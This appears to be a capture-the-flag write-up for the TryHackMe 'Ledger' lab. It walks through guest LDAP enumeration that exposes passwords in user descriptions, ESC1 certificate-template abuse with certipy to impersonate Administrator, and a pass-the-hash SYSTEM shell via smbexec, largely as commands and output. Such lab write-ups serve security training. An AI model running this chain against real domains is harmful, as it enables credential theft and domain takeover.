---
title: "TryHackMe: Ledger"
author: jaxafed
categories: [TryHackMe]
tags: [windows, nxc, netexec, ldap, active directory, ad, ad cs, esc1, impacket, certipy]
render_with_liquid: false
media_subpath: /images/tryhackme_ledger/
image:
  path: room_image.webp
---

**Ledger** was a straightforward room where we gained access via passwords found in user descriptions and escalated to **Administrator** by exploiting the **ESC1** vulnerability in a certificate template.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/ledger){: .center }

## Initial Enumeration

### Nmap Scan

We start with an **`nmap`** scan:

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.28.243
Nmap scan report for 10.10.28.243
Host is up (0.096s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
...
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-03 02:05:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-06-24T14:40:22
|_Not valid after:  2025-06-24T14:40:22
|_ssl-date: 2025-05-03T02:06:54+00:00; +2s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
...
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
...
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
...
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
...
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
...
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the port scan, it seems we are dealing with a **Domain Controller (DC)**, so we update our hosts file accordingly:

```
10.10.28.243 labyrinth.thm.local thm.local LABYRINTH
```
{: file="/etc/hosts" }

## User Flag

Checking the target for **guest** authentication using `netexec`, we can see that it works:

```console
$ nxc smb labyrinth.thm.local -u 'guest' -p ''
SMB         10.10.28.243    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.10.28.243    445    LABYRINTH        [+] thm.local\guest:
```

Also authenticating to **LDAP** as `guest` and fetching the users with `netexec`, we can see what looks like a password in the description field of two users:

```console
$ nxc ldap labyrinth.thm.local -u 'guest' -p '' --users
LDAP        10.10.28.243    389    LABYRINTH        -Username-                    -Last PW Set-       -BadPW- -Description-
...
LDAP        10.10.28.243    389    LABYRINTH        IVY_WILLIS                    2023-05-30 12:30:55 0       Please change it: C[REDACTED]!
...
LDAP        10.10.28.243    389    LABYRINTH        SUSANNA_MCKNIGHT              2023-07-05 15:11:32 0       Please change it: C[REDACTED]!
...
```

Trying to validate them, we can see that both sets of credentials work:

```console
$ nxc smb labyrinth.thm.local -u 'IVY_WILLIS' -p 'C[REDACTED]!'
SMB         10.10.28.243    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.10.28.243    445    LABYRINTH        [+] thm.local\IVY_WILLIS:C[REDACTED]!

$ nxc smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'C[REDACTED]!'
SMB         10.10.28.243    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.10.28.243    445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:C[REDACTED]!
```

Since the **RDP** port was open on the target, checking the discovered credentials against RDP shows that **SUSANNA\_MCKNIGHT** can RDP into the machine:

```console
$ nxc rdp labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'C[REDACTED]!'
RDP         10.10.28.243    3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
RDP         10.10.28.243    3389   LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:C[REDACTED]! (Pwn3d!)
```

Using `xfreerdp` to RDP into the machine, we can find the user flag inside the `user.txt` file on the desktop:

```console
$ xfreerdp /v:labyrinth.thm.local /u:'SUSANNA_MCKNIGHT' /p:'C[REDACTED]!' /dynamic-resolution /clipboard /cert:ignore
```

![User Flag](user_flag.webp){: width="1000" height="7000"}

## Root Flag

Checking AD CS for vulnerable certificate templates using `certipy`, we find a certificate template called **ServerAuth** vulnerable to **ESC1**:

```console
$ certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'C[REDACTED]!' -target labyrinth.thm.local -stdout -vulnerable

...

Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Property Principals       : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
```

To briefly explain why the `ServerAuth` certificate is vulnerable to ESC1, there are three key factors:

* **Enrollment Rights**: `THM.LOCAL\Authenticated Users` can enroll, allowing us to request the certificate.

> Even if `THM.LOCAL\Authenticated Users` didn’t have enrollment rights, we could still exploit the template by creating a computer account and using that to enroll, since `THM.LOCAL\Domain Computers` also has enrollment rights.
{: .prompt-tip }

* **Client Authentication EKU**: The certificate can be used for authentication to Active Directory.

* **EnrolleeSuppliesSubject**: This is the core vulnerability — it allows us to specify the certificate’s subject, enabling us to impersonate any account.

Next, we use `certipy` to request a certificate from the vulnerable **ServerAuth** template while impersonating the **Administrator** user:

```console
$ certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'C[REDACTED]!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 25
[*] Got certificate with UPN 'Administrator@thm.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

> If you get a timeout error, just try running the command again.
{: .prompt-tip }

Finally, using the certificate to authenticate as the **Administrator** user, we retrieve their NTLM hash:

```console
$ certipy-ad auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@thm.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d6[REDACTED]2322
```
>  You need to make sure your system time is synchronized with the target for this step.
{: .prompt-tip }

Using this hash, we can use Impacket’s `smbexec` to spawn a shell and read the root flag from the **Administrator**'s desktop to complete the room:

```console
$ smbexec.py -k -hashes :07d6[REDACTED]2322 THM.LOCAL/Administrator@labyrinth.thm.local
Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
THM{[REDACTED]}
```

> We are using the `-k` flag to force `smbexec.py` to use **Kerberos** authentication because the **Administrator** user is a member of the **Protected Users** group.
{: .prompt-tip }

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>

